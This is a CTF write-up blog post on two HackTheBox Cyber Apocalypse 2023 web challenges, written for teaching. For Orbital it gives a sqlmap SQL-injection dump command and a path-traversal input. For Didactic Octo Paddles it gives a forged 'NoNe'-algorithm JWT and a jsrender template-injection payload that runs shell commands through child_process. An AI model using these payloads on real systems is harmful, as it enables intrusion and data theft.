---
title: 'HackTheBox CyberApocalypse 2023 - Web'
authors:
  - Lê Hoàng
date: '2023-03-23T00:00:00Z'
doi: ''

# Schedule page publish date (NOT publication's date).
publishDate: '2023-03-23T00:00:00Z'

# Publication type.
# Legend: 0 = Uncategorized; 1 = Conference paper; 2 = Journal article;
# 3 = Preprint / Working Paper; 4 = Report; 5 = Book; 6 = Book section;
# 7 = Thesis; 8 = Patent
publication_types: ['9']

# Publication name and optional abbreviated publication name.
publication: ''
publication_short: ''

abstract: HackTheBox CyberApocalypse 2023 - Web application writeups.

# Summary. An optional shortened abstract.
summary: HTB CyberApocalypse 2023 - Web writeups.

tags:
  - ctf
  - writeup
  - web exploitation
  - web
  - htb
  - hackthebox
  - cyberapocalypse-2023

featured: false

links:
#   - name: 
#     url: 
url_pdf: ''
url_code: ''
url_dataset: ''
url_poster: ''
url_project: ''
url_slides: ''
url_source: ''
url_video: ''

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder.
image:
  caption: 'Image credit: [**CyberApocalypse 2023**](https://ctftime.org/event/1889)'

# Associated Projects (optional).
#   Associate this publication with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `internal-project` references `content/project/internal-project/index.md`.
#   Otherwise, set `projects: []`.
projects: []
    # - ctf-2022-writeups

# Slides (optional).
#   Associate this publication with Markdown slides.
#   Simply enter your slide deck's filename without extension.
#   E.g. `slides: "example"` references `content/slides/example/index.md`.
#   Otherwise, set `slides: ""`.
slides: ""
---
{{< toc >}}
## Introduction
Welcome to my blog post about the web challenges in the HTB Cyber Apocalypse 2023 competition! For those who may not be familiar, HTB (Hack The Box) is a platform that provides a range of cybersecurity challenges for users to test and improve their skills. Cyber Apocalypse 2023 was a massive virtual event that took place in February 2023, where thousands of participants from all over the world competed in a range of challenges, including web, crypto, reverse engineering, and more.

We were able to reach 29th place and solve 60/74 challenges. Particularly for web challenges, we got 8/9 (the one we didn't solve was Unearthly Shop).

<img src="flexing.png" alt="">

In this blog post, I will focus specifically on the web challenges in the Cyber Apocalypse 2023 competition. I will provide a detailed analysis of each challenge, along with my thought process and the techniques I used to solve them. Whether you're an aspiring cybersecurity professional or a seasoned veteran, I hope you find my write-ups informative and helpful!

## Orbital (easy)
### Challenge
**Given file:**: [Get it here](https://github.com/HoangREALER/cyberApocalypse2023/blob/main/web_orbital.zip)

**Description**: In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?

### Solution
At first, we were given the login page which requires credentials. There's nothing else you can do at this point than reading given code.

<img src="orbital1.png" alt="Login page"/>

Upon given the code, you can find out that there is 1 user "admin" which is initiated at the time the docker is created. We can also see that, the application only has SELECT privilege on table `orbital.users` and `orbital.communications`.

```bash
mysql -u root << EOF
CREATE DATABASE orbital;
CREATE TABLE orbital.users (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    username varchar(255) NOT NULL UNIQUE,
    password varchar(255) NOT NULL
);
CREATE TABLE orbital.communication (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    source varchar(255) NOT NULL,
    destination varchar(255) NOT NULL,
    name varchar(255) NOT NULL,
    downloadable varchar(255) NOT NULL
);
INSERT INTO orbital.users (username, password) VALUES ('admin', '$(genPass)');
INSERT INTO orbital.communication (source, destination, name, downloadable) VALUES ('Titan', 'Arcturus', 'Ice World Calling Red Giant', 'communication.mp3');
INSERT INTO orbital.communication (source, destination, name, downloadable) VALUES ('Andromeda', 'Vega', 'Spiral Arm Salutations', 'communication.mp3');
INSERT INTO orbital.communication (source, destination, name, downloadable) VALUES ('Proxima Centauri', 'Trappist-1', 'Lone Star Linkup', 'communication.mp3');
INSERT INTO orbital.communication (source, destination, name, downloadable) VALUES ('TRAPPIST-1h', 'Kepler-438b', 'Small World Symposium', 'communication.mp3');
INSERT INTO orbital.communication (source, destination, name, downloadable) VALUES ('Winky', 'Boop', 'Jelly World Japes', 'communication.mp3');
CREATE USER 'user'@'localhost' IDENTIFIED BY 'M@k3l@R!d3s$';
GRANT SELECT ON orbital.users TO 'user'@'localhost';
GRANT SELECT ON orbital.communication TO 'user'@'localhost';
FLUSH PRIVILEGES;
EOF
```

Now let's move on with the application. At first glance at source code, we can see it is vulnerable to Local File Inclusion attack at this endpoint `blueprints/routes.py`.

```python
from flask import Blueprint, render_template, request, session, redirect, send_file
from application.database import login, getCommunication
from application.util import response, isAuthenticated

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/')
def signIn():
    return render_template('login.html')

@web.route('/logout')
def logout():
    session['auth'] = None
    return redirect('/')

@web.route('/home')
@isAuthenticated
def home():
    allCommunication = getCommunication()
    return render_template('home.html', allCommunication=allCommunication)

@api.route('/login', methods=['POST'])
def apiLogin():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    if not username or not password:
        return response('All fields are required!'), 401
    
    user = login(username, password)
    
    if user:
        session['auth'] = user
        return response('Success'), 200
        
    return response('Invalid credentials!'), 403

@api.route('/export', methods=['POST'])
@isAuthenticated
def exportFile():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    communicationName = data.get('name', '')

    try:
        # Everyone is saying I should escape specific characters in the filename. I don't know why.
        return send_file(f'/communications/{communicationName}', as_attachment=True)
    except:
        return response('Unable to retrieve the communication'), 400
```

Here we can see when we call `/api/export` with POST method it will use body parameter `name` to get the files. We can exploit this to get the flag using something like `name=../../../../flag.txt`. But to use this endpoint, we must be authenticated, at the context of this challenge only "admin" user can be authenticated.

Looking at how authentication works, I found out a place that is vulnerable to SQL Injection. However keep in mind that we are only granted access to SELECT on table `users` and `communications`. I decided to use `sqlmap` to save the what're left of my brain cells.

```python
def login(username, password):
    # I don't think it's not possible to bypass login because I'm verifying the password later.
    user = query(f'SELECT username, password FROM users WHERE username = "{username}"', one=True)

    if user:
        passwordCheck = passwordVerify(user['password'], password)

        if passwordCheck:
            token = createJWT(user['username'])
            return token
    else:
        return False
```

I decided to use `Burpsuite` to capture to login request, modified the field `username` with value `*` and saved it for the usage of `sqlmap`.

<img src="orbital2.png" alt="Burpsuite demo"/>

I saved it as `req.txt`. Since the database and the table was already known the command I used was: 

```bash
sqlmap -r req.txt --level=5 --risk=3 --technique=T -o --ignore-code 401 -D orbital -T users --dump
```

<img src="orbital3.png" alt="SQLMap demo"/>

Nice but we only got the hash. Initially, we was trying to use `hashcat` but since this is HackTheBox, the challenge may use well-known hash so I throw it on the internet and Voila! The credential is `admin:ichliebedich`, login and use LFI attack the get flag.

<img src="orbital4.png" alt="SQLMap demo"/>

<img src="orbital5.png" alt="SQLMap demo"/>

Flag: `HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}`


## Didactic Octo Paddles (medium)
### Challenge
**Given File**: [Get it here](https://github.com/HoangREALER/cyberApocalypse2023/blob/main/web_didactic_octo_paddle.zip)

**Description**: You have been hired by the Intergalactic Ministry of Spies to retrieve a powerful relic that is believed to be hidden within the small paddle shop, by the river. You must hack into the paddle shop's system to obtain information on the relic's location. Your ultimate challenge is to shut down the parasitic alien vessels and save humanity from certain destruction by retrieving the relic hidden within the Didactic Octo Paddles shop.

### Solution
This time it gives us a login panel like the last time. Except this time it also has register function. Let's look at the main routes in the source code.

`challenge/routes/index.js`
```js
module.exports = (db) => {
    const bcrypt = require("bcryptjs");
    const router = require("express").Router();
    const jwt = require("jsonwebtoken");
    const jsrender = require("jsrender");
    const AuthMiddleware = require("../middleware/AuthMiddleware");
    const AdminMiddleware = require("../middleware/AdminMiddleware");
    const { tokenKey, getUserId } = require("../utils/authorization");

    const response = (data) => ({ message: data });

    router.get("/", AuthMiddleware, async (req, res) => {
        try {
            const products = await db.Products.findAll();
            res.render("index", { products: products });
        } catch (error) {
            console.error(error);
            res.status(500).send("Something went wrong!");
        }
    });

    ........

    router.post("/register", async (req, res) => {
        try {
            const username = req.body.username;
            const password = req.body.password;

            if (!username || !password) {
                return res
                    .status(400)
                    .send(response("Username and password are required"));
            }

            const existingUser = await db.Users.findOne({
                where: { username: username },
            });
            if (existingUser) {
                return res
                    .status(400)
                    .send(response("Username already exists"));
            }

            await db.Users.create({
                username: username,
                password: bcrypt.hashSync(password),
            }).then(() => {
                res.send(response("User registered succesfully"));
            });
        } catch (error) {
            console.error(error);
            res.status(500).send({
                error: "Something went wrong!",
            });
        }
    });

    ........

    router.post("/login", async (req, res) => {
        try {
            const username = req.body.username;
            const password = req.body.password;

            if (!username || !password) {
                return res
                    .status(400)
                    .send(response("Username and password are required"));
            }

            const user = await db.Users.findOne({
                where: { username: username },
            });
            if (!user) {
                return res
                    .status(400)
                    .send(response("Invalid username or password"));
            }

            const validPassword = bcrypt.compareSync(password, user.password);
            if (!validPassword) {
                return res
                    .status(400)
                    .send(response("Invalid username or password"));
            }

            const token = jwt.sign({ id: user.id }, tokenKey, {
                expiresIn: "1h",
            });

            res.cookie("session", token);

            return res.status(200).send(response("Logged in successfully"));
        } catch (error) {
            console.error(error);
            res.status(500).send({
                error: "Something went wrong!",
            });
        }
    });

    ........

    router.get("/admin", AdminMiddleware, async (req, res) => {
        try {
            const users = await db.Users.findAll();
            const usernames = users.map((user) => user.username);

            res.render("admin", {
                users: jsrender.templates(`${usernames}`).render(),
            });
        } catch (error) {
            console.error(error);
            res.status(500).send("Something went wrong!");
        }
    });

    router.get("/logout", async (req, res) => {
        res.clearCookie("session");
        return res.redirect("/");
    });

    return router;
};
```
Okay, so it has some basic authentication funtions like `register`, `login` and `logout`; in addition to that we also has 2 authorization middlewares `AdminMiddleware` and `AuthMiddleware`. And they all use [`Json Web Token (JWT)`](https://jwt.io/).

```js
router.get("/admin", AdminMiddleware, async (req, res) => {
    try {
        const users = await db.Users.findAll();
        const usernames = users.map((user) => user.username);

        // This pepega jsrender things
        res.render("admin", {
            users: jsrender.templates(`${usernames}`).render(),
        });
    } catch (error) {
        console.error(error);
        res.status(500).send("Something went wrong!");
    }
});

router.get("/logout", async (req, res) => {
    res.clearCookie("session");
    return res.redirect("/");
});

return router;
```

What really stands out of them all is at the `/admin` endpoint which allows us to inject something in the template. But first, we need to bypass the `AuthMiddleware`. Looking what it does, we find something really interesting.


```js
const AdminMiddleware = async (req, res, next) => {
    try {
        const sessionCookie = req.cookies.session;
        if (!sessionCookie) {
            return res.redirect("/login");
        }
        const decoded = jwt.decode(sessionCookie, { complete: true });

        if (decoded.header.alg == 'none') {
            return res.redirect("/login");
        } else if (decoded.header.alg == "HS256") {
            const user = jwt.verify(sessionCookie, tokenKey, {
                algorithms: [decoded.header.alg],
            });
            if (
                !(await db.Users.findOne({
                    where: { id: user.id, username: "admin" },
                }))
            ) {
                return res.status(403).send("You are not an admin");
            }
        } else {
            const user = jwt.verify(sessionCookie, null, {
                algorithms: [decoded.header.alg],
            });
            if (
                !(await db.Users.findOne({
                    where: { id: user.id, username: "admin" },
                }))
            ) {
                return res
                    .status(403)
                    .send({ message: "You are not an admin" });
            }
        }
    } catch (err) {
        return res.redirect("/login");
    }
    next();
};
```

Do you see something fun here ? It checks for the header algorith field. If it is `none`, it makes us login again. And if it is `HS256`, which basically the same algorithm it uses to authenticate, the app verifies using the random generated key. Or "else" it verifies with no key at all. This is fun because only with algorithm `none`, the function `verify` would work.

I was banging my head for a while, I realised that it doesn't check for `NoNe`, `NonE` but it is still able to decoded and verified. That lead us to craft a  JWT to pass to the `session` cookie for admin previlege. I crafted the JWT manually 😵‍💫.

```
eyJhbGciOiJOb05lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiaWF0IjoxNjc5NTk0OTY1LCJleHAiOjI2Nzk1OTg1NjV9.
{
  "alg": "None",
  "typ": "JWT"
}
{
  "id": 1,
  "iat": 1679594965,
  "exp": 2679598565
}
```

I modified the algorithm to `None`, "id" to `1` as 1 is the id of "admin" and set the expiration time to oblivion so I can take my time to get the flag.

<img src="dict1.png" alt="Admin panel demo"/>

For the flag, look again at the routes' functions, we can get the flag through [SSTI on jsrender](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jsrender-nodejs). To do so the payload must be one of the usernames registered. Only thing we have to do now is to register a new account with the payload for the username.

`{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()")()}}`

<img src="dict2.png" alt="Payload"/>

<img src="dict3.png" alt="Admin panel demo"/>

Flag: `HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}`

## SpyBug (medium) (coming soon)

## TrapTrack (hard) (coming soon)